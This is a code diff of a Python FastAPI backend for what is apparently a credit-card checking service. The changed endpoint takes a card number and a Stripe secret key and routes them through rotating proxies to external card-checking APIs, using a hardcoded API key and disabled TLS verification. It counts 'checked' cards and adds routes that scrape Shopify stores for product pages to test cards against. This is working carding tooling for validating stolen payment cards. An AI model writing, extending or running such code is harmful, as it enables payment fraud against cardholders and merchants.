@@ -15,6 +15,8 @@ from typing import List, Optional
 import requests
 import asyncio
 import urllib3
+from bs4 import BeautifulSoup
+import httpx
 
 urllib3.disable_warnings()
 
@@ -360,47 +362,7 @@ async def check_proxies(req: ProxyCheckRequest, user: dict = Depends(get_current
         "saved": successful
     }
 
-class CheckerRequest(BaseModel):
-    gateway: str
-    card: str
-    sk_type: Optional[str] = None # "sk_based" or "non_sk"
-    sk: Optional[str] = None
-    site_type: Optional[str] = None # "own" or "inbuilt"
-
-import random
-
-@app.post("/api/checker/run")
-async def run_checker(req: CheckerRequest, user: dict = Depends(get_current_user)):
-    cursor = db.proxies.find({"user_id": str(user["_id"])})
-    proxies = await cursor.to_list(length=100)
-    proxy_url = ""
-    if proxies:
-        proxy_url = random.choice(proxies)["raw"]
-        
-    try:
-        if req.gateway == "stripe":
-            target_sk = req.sk
-            if req.sk_type == "non_sk":
-                admin = await db.users.find_one({"role": "admin"})
-                target_sk = admin.get("stripe_sk") if admin else None
-                if not target_sk:
-                    return {"status": False, "message": "Admin has not configured a global Secret Key"}
-            elif not target_sk:
-                target_sk = user.get("stripe_sk")
-                if not target_sk:
-                    return {"status": False, "message": "Missing Secret Key. Please configure it in settings or provide it."}
-                
-            url = f"https://api.barryxapi.xyz/skbased?key=BRY-KESNP-TUPWH-JFOT9&card={req.card}&sk={target_sk}&proxy={proxy_url}"
-            res = requests.get(url, timeout=20.0, verify=False)
-            data = res.json()
-            
-            await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$inc": {"total_checked_ccs": 1}})
-            return data
-            
-        elif req.gateway == "shopify":
-from bs4 import BeautifulSoup
-import httpx
-
+# SHOPIFY TOOLS ROUTES
 @app.get("/api/shopify_tools/stores")
 async def get_stores(keyword: str, page: int, user: dict = Depends(get_current_user)):
     url = f"https://shopifyspy.com/stores/niches/{keyword}/?page={page}&search_niche={keyword}&orderBy=sw_rank"
@@ -456,18 +418,63 @@ async def get_products(req: ProductsRequest, user: dict = Depends(get_current_us
     flat_list = [url for sublist in results for url in sublist]
     return {"products": list(set(flat_list))}
 
-            target_urls = ""
-            if req.site_type == "inbuilt":
+# CHECKER ENGINE
+class CheckerRequest(BaseModel):
+    gateway: str
+    card: str
+    sk_type: Optional[str] = None # "sk_based" or "non_sk"
+    sk: Optional[str] = None
+    site_type: Optional[str] = None # "own" or "inbuilt"
+    product_url: Optional[str] = None
+
+import random
+
+@app.post("/api/checker/run")
+async def run_checker(req: CheckerRequest, user: dict = Depends(get_current_user)):
+    cursor = db.proxies.find({"user_id": str(user["_id"])})
+    proxies = await cursor.to_list(length=100)
+    proxy_url = ""
+    if proxies:
+        proxy_url = random.choice(proxies)["raw"]
+        
+    try:
+        if req.gateway == "stripe":
+            target_sk = req.sk
+            if req.sk_type == "non_sk":
                 admin = await db.users.find_one({"role": "admin"})
-                target_urls = admin.get("shopify_urls", "") if admin else ""
+                target_sk = admin.get("stripe_sk") if admin else None
+                if not target_sk:
+                    return {"status": False, "message": "Admin has not configured a global Secret Key"}
+            elif not target_sk:
+                target_sk = user.get("stripe_sk")
+                if not target_sk:
+                    return {"status": False, "message": "Missing Secret Key. Please configure it in settings or provide it."}
+                
+            url = f"https://api.barryxapi.xyz/skbased?key=BRY-KESNP-TUPWH-JFOT9&card={req.card}&sk={target_sk}&proxy={proxy_url}"
+            res = requests.get(url, timeout=20.0, verify=False)
+            data = res.json()
+            
+            await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$inc": {"total_checked_ccs": 1}})
+            return data
+            
+        elif req.gateway == "shopify":
+            target_urls = ""
+            
+            # If product_url is provided (e.g. via Shopify Tools verifier) we use it directly
+            if req.product_url:
+                product_url = req.product_url
             else:
-                target_urls = user.get("shopify_urls", "")
-                
-            urls_list = [u.strip() for u in target_urls.split("\n") if u.strip()]
-            if not urls_list:
-                return {"status": False, "message": "No product URLs configured in settings"}
-                
-            product_url = random.choice(urls_list)
+                if req.site_type == "inbuilt":
+                    admin = await db.users.find_one({"role": "admin"})
+                    target_urls = admin.get("shopify_urls", "") if admin else ""
+                else:
+                    target_urls = user.get("shopify_urls", "")
+                    
+                urls_list = [u.strip() for u in target_urls.split("\n") if u.strip()]
+                if not urls_list:
+                    return {"status": False, "message": "No product URLs configured in settings"}
+                    
+                product_url = random.choice(urls_list)
             
             payload = {
                 "key": "BRY-KESNP-TUPWH-JFOT9",
@@ -476,14 +483,6 @@ async def get_products(req: ProductsRequest, user: dict = Depends(get_current_us
                 "proxy": proxy_url
             }
             res = requests.post("https://api.barryxapi.xyz/auto_sh", json=payload, timeout=20.0, verify=False)
-            data = res.json()
-            
-            await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$inc": {"total_checked_ccs": 1}})
-            return data
-            
-        elif req.gateway == "shopify_v2":
-            url = f"https://gates.valyrian.cc/autoshopify/curl/check?card={req.card}&proxy={proxy_url}"
-            res = requests.get(url, timeout=30.0, verify=False)
             data = res.json()
             
             await db.users.update_one({"_id": ObjectId(user["_id"])}, {"$inc": {"total_checked_ccs": 1}})
